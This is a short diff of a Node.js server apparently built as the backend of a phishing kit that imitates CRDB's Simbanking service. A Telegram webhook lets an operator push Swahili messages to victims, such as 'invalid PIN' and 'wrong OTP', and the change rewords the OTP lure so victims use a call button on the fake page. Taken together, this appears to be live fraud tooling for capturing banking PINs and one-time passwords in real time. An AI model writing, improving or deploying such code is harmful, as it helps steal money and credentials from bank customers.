@@ -222,7 +222,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
           sessions[sessionId].notification = 'INVALID PIN: Tafadhali ingiza PIN sahihi ya Simbanking.';
         } else if (action === 'proceedotp') {
           sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'Nenda kwenye simu piga *150*03# kupata OTP. Nafasi ya kujaza itafunguka baada ya hapo.';
+          sessions[sessionId].notification = 'Fuata maelezo na utumie kitufe cha kupiga simu kilicho kwenye ukurasa kupata OTP.';
         } else if (action === 'wrongotp') {
           sessions[sessionId].status = 'enter_otp';
           sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP ya tarakimu 5.';
@@ -258,4 +258,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`CRDB Server running on port ${PORT}`));
-    
+          
